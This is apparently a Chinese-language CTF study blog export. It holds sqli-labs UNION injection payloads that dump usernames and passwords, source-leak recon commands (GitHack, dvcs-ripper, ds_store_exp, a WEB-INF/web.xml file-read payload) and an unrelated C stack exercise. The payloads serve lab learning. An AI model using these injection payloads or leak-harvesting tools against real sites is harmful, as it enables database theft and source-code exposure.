小提一下php里的一些转义函数</h3><p>有时候php里的一些函数在传入的参里有’,”,&#x2F;等字符时，会在其前面自动补’&#x2F;‘对1其转义，防止sql注入</p><h1 id="lesson-3-需要闭合括号的注入"><a href="#lesson-3-需要闭合括号的注入" class="headerlink" title="lesson_3 需要闭合括号的注入"></a>lesson_3 需要闭合括号的注入</h1><p>首先构造闭合单引&#x2F;?id&#x3D;1’，返回报错: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1<br>发现了一个奇怪的’(‘，搜索得知，这是个需要闭合括号的注入, 查看php源码发现它的指令如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;$id&#x27;</span>);<br></code></pre></td></tr></table></figure><p>而我们之前注入的php源码则是这样:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span>;<br></code></pre></td></tr></table></figure><p>所以加个’)’进行闭合就阔以啦!<br>实操，很ez</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,database(),user()</span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-keyword">user</span>() <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">-- </span><br>?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(column_name),user() from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p><img src="/images/sqli_labs/sqli_labs(1).png"></p><h1 id="数字型注入知识点"><a href="#数字型注入知识点" class="headerlink" title="数字型注入知识点"></a>数字型注入知识点</h1><h2 id="数字型和字符型的区别"><a href="#数字型和字符型的区别" class="headerlink" title="数字型和字符型的区别"></a>数字型和字符型的区别</h2><p>数字型传入的参数8是包裹在引号里的，传入的参会被转化为数字，比如传入id&#x3D;1+1，系统会查找id&#x3D;2的行</p><p>其注入方法，除了8需要用’闭合外，和字符型注入差不多</p><h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p>php里的强制类型转换规则，和c可8大一样</p><p>比如输入’shit’,’1shit’,’2shit’,若强制转换为数字, 会分别被转为: 0,1,2</p><p>因为’shit’里，第一个字符8是数字，就会转化成0;’1shit’则会转化为1，忽略后面的非数字</p><h2 id="在数字型注入想输入字符"><a href="#在数字型注入想输入字符" class="headerlink" title="在数字型注入想输入字符"></a>在数字型注入想输入字符</h2><p>2种方法</p><h3 id="使用16进制"><a href="#使用16进制" class="headerlink" title="使用16进制"></a>使用16进制</h3><p>待填</p><h3 id="使用char-函数"><a href="#使用char-函数" class="headerlink" title="使用char()函数"></a>使用char()函数</h3><p>待填</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码泄露&#92;信息搜集小总结</title>
    <link href="/2021/10/15/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/"/>
    <url>/2021/10/15/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>各种源码泄露总结的笔记</p><span id="more"></span><p>贴个<a href="https://skills.bugbank.cn/skill.html?type=11">链接</a><br>还有其他<a href="https://blog.csdn.net/Fly_hps/article/details/82821857">参考文献</a></p><h1 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>开发人员使用 git 进行版本控制，对站点部署。但如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>用扫描器扫描(俺用的御剑，如果字典里没有得自己加)，大概像这样<br><img src="/images/git%E6%B3%84%E9%9C%B2(1).png"><br>如果能访问那就存在git泄露<br>也可以试着访问 .git&#x2F;head 文件，如果能下载也能推断存在 Git 源码泄露</p><h2 id="获取泄露的源码"><a href="#获取泄露的源码" class="headerlink" title="获取泄露的源码"></a>获取泄露的源码</h2><p>阔以用GitHack脚本，可以解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码。通过泄露的.git文件夹下的文件重建还原工程源代码。键入下面的命令就会把存在Git泄露的源码全部下载下来<br>命令：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">GitHack.py <span class="hljs-built_in">url</span><br></code></pre></td></tr></table></figure><p>(注：此处url是.git的url)<br><a href="https://github.com/lijiejie/GitHack">GitHack下载链接</a></p><h2 id="实战-buuctf-第一章-web入门-粗心的小李"><a href="#实战-buuctf-第一章-web入门-粗心的小李" class="headerlink" title="实战: buuctf[第一章 web入门]粗心的小李"></a>实战: buuctf[第一章 web入门]粗心的小李</h2><p>首先，下载githack，然后终端打开，执行: python githack.py 链接&#x2F;.git&#x2F;<br>然后就可以看到githack目录下多了个以目标链接命名的文件夹，打开就阔以找到flag辣</p><h1 id="敏感备份文件泄露"><a href="#敏感备份文件泄露" class="headerlink" title="敏感备份文件泄露"></a>敏感备份文件泄露</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：<br>第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn<br>常见的备份文件格式有：<br>index.phps<br>index.php.swp<br>index.php.swo<br>index.php.php~<br>index.php.bak<br>index.php.txt<br>index.php.old<br>index.php~</p><p>注意: 有时候用dirsearch、菜刀等工具扫描时会因频率而被429限制访问，这时候需要延迟爆破频率</p><h1 id="java之WEB-INF文件泄露"><a href="#java之WEB-INF文件泄露" class="headerlink" title="java之WEB-INF文件泄露"></a>java之WEB-INF文件泄露</h1><h2 id="WEB-INF"><a href="#WEB-INF" class="headerlink" title="WEB-INF"></a>WEB-INF</h2><p>WEB-INF是java的web应用的的安全目录(所谓安全就是客户端无法访问，只有服务端可以访问的目录)，若想在页面里直接访问其中文件，必须通过web.xml对要访问的文件映射才能访问<br>WEB-INF主要有以下文件:<br>WEB-INF&#x2F;web.xml: 配置文件，路径映射<br>WEB-INF&#x2F;classes: 含了站点所有用的 class 文件(包括 servlet class 和非servlet class)<br>WEB-INF&#x2F;lib: 存放web应用需要的各种JAR文件<br>WEB-INF&#x2F;src: 源码<br>WEB-INF&#x2F;database.properties: 数据库配置文件</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>通常在web应用中我们会用多个web服务器用来彼此弥补<br>使用这种架构时，若对资源的目录或文件的映射配置不当，可能会导致web.xml文件可被读取</p><p>利用漏洞: 通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><h2 id="实战-RoarCTF-2019-Easy-Java"><a href="#实战-RoarCTF-2019-Easy-Java" class="headerlink" title="实战: [RoarCTF 2019]Easy Java"></a>实战: [RoarCTF 2019]Easy Java</h2><p>进入页面，是个登陆界面，sql注入试了一下，发现没有用<br>登陆页面下有个help窗口，尝试访问，url变成: &#x2F;Download?filename&#x3D;help.docx，也就是可以随意查询文件….但是它返回的结果是: java.io.FileNotFoundException:{help.docx}</p><p>然后我就8会了，看wp，发现要进行post传参，但我找了10几个wp也没明白为啥要这么搞，就tm离谱…<br>post传参: </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">filename</span><span class="hljs-operator">=</span>WEB-INF/web.xml<br></code></pre></td></tr></table></figure><p>下载下来发现关键映射: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>Index<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Flag<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据映射可以看到: FlagController里应该有flag<br>payload:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">filename=<span class="hljs-regexp">/WEB-INF/classes</span><span class="hljs-regexp">/com/wm</span><span class="hljs-regexp">/ctf/</span>FlagController.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>我: ???</p><h1 id="hg文件泄露"><a href="#hg文件泄露" class="headerlink" title=".hg文件泄露"></a>.hg文件泄露</h1><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。hg.init 的时候会形成.hg文件夹，如果配置不当,可能会将.hg 文件夹直接部署到线上环境，引起泄露<br>工具: <a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-hg.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.hg/</span><br></code></pre></td></tr></table></figure><h1 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h1><p>在发布代码时未删除文件夹中隐藏的.DS_store，可获取敏感的文件名等信息。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以访问一下(<a href="http://www.example.com/.ds_store)%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%A9%E7%94%A8[dsstoreexp](https://github.com/lijiejie/ds_store_exp)%E5%B7%A5%E5%85%B7">http://www.example.com/.ds_store)，然后利用[dsstoreexp](https://github.com/lijiejie/ds_store_exp)工具</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ds_store_exp.<span class="hljs-keyword">py</span> http://www.example.<span class="hljs-keyword">com</span>/.DS_Store<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构第二次上鸡</title>
    <link href="/2021/10/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%B8%8A%E9%B8%A1/"/>
    <url>/2021/10/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%B8%8A%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>第二次上鸡，搓了好久</p><h2 id="问1-搓代码将10进制转化为2进制，要用到栈"><a href="#问1-搓代码将10进制转化为2进制，要用到栈" class="headerlink" title="问1:搓代码将10进制转化为2进制，要用到栈"></a>问1:搓代码将10进制转化为2进制，要用到栈</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> More 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Init_Size 120</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>ElemType *ebp;<br>ElemType *esp;<br><span class="hljs-type">int</span> Size;<br>&#125;SqStack;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(SqStack &amp;S)</span>&#123;<br>S.ebp=(ElemType*)<span class="hljs-built_in">malloc</span>(Init_Size*<span class="hljs-keyword">sizeof</span>(ElemType));<br>S.esp=S.ebp;<br>S.Size=Init_Size;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Get</span><span class="hljs-params">(SqStack &amp;S,ElemType e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)<span class="hljs-keyword">return</span>;<br>e=*(S.esp<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack &amp;S,ElemType e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp-S.ebp==S.Size)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Th3 5t4ck 1s fu11!\n&quot;</span>);<br>S.ebp=(ElemType*)<span class="hljs-built_in">realloc</span>(S.ebp,<span class="hljs-keyword">sizeof</span>(ElemType)*(S.Size+More));<br>S.Size+=More;<br>&#125;<br>*(S.esp++)=e;<br><span class="hljs-comment">//printf(&quot;Pu5h 5ucc3553d,e=%d\n&quot;,e);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack &amp;S,ElemType &amp;e)</span>&#123;<span class="hljs-comment">//e来返回值 </span><br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>e=*(--S.esp); <br><span class="hljs-keyword">return</span>; <br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Conversion</span><span class="hljs-params">(SqStack &amp;S,<span class="hljs-type">int</span> x)</span>&#123;<br><span class="hljs-type">int</span> a,b,y=x;<br><span class="hljs-keyword">while</span>(y!=<span class="hljs-number">1</span>)&#123;<br>a=y/<span class="hljs-number">2</span>;<br>b=y%<span class="hljs-number">2</span>;<br>Push(S,b);<br>y=a;<br><span class="hljs-comment">//printf(&quot;b=%d,y=%d\n&quot;,b,y);</span><br>&#125;<br><span class="hljs-comment">//printf(&quot;F1n15h3d,esp-ebp=%d\n&quot;,S.esp-S.ebp);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">IfEmpty</span><span class="hljs-params">(SqStack S)</span>&#123;<br><span class="hljs-keyword">if</span>(S.ebp==S.esp)&#123;<br><span class="hljs-comment">//printf(&quot;esp-ebp=%d,3mpty!\n&quot;,S.esp-S.ebp);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//printf(&quot;N0t 3mpty!\n&quot;);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> x,e,i;<br>SqStack S;<br>Init(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个10进制数：\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>Conversion(S,x);<br><span class="hljs-keyword">while</span>(IfEmpty(S)!=<span class="hljs-number">1</span>)&#123;<br>Pop(S,i);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,i);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关于引用和解引用"><a href="#关于引用和解引用" class="headerlink" title="关于引用和解引用"></a>关于引用和解引用</h3><p><em>在c中有解引用的用法，对于一个指针p，</em>p表示对p进行”解释”，通俗来说就是取值的意思。而相对应的，&amp;还有脱去解引用的意思，比如对于指针L,&amp;*L表示L先取值，再用&amp;脱去解引用，所以结果还是地址的意思。。。。</p><h2 id="问2-括号匹配问题"><a href="#问2-括号匹配问题" class="headerlink" title="问2:括号匹配问题"></a>问2:括号匹配问题</h2><p>设一个表达式中可以包含三种括号：“(”和“)”、“[”和“]”、“{”和“}”，并且这三种括号可以按照任意的次序嵌套使用，考查表达式中的括号是否匹配。<br>【基本要求】<br>写一个程序，判断给定表达式中的括号是否匹配。<br>【测试数据】<br>有多个表达式，每个表达式（不超过100个字符）占一行。例如，<br>[(d+f)*{}2]<br>[(2+3))<br>()}<br>[4(6]7)9</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>ElemType * esp;<br>ElemType * ebp;<br><span class="hljs-type">int</span> size;<br>&#125; Stack;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(Stack &amp;S)</span>&#123;<br>S.ebp=(ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType)*<span 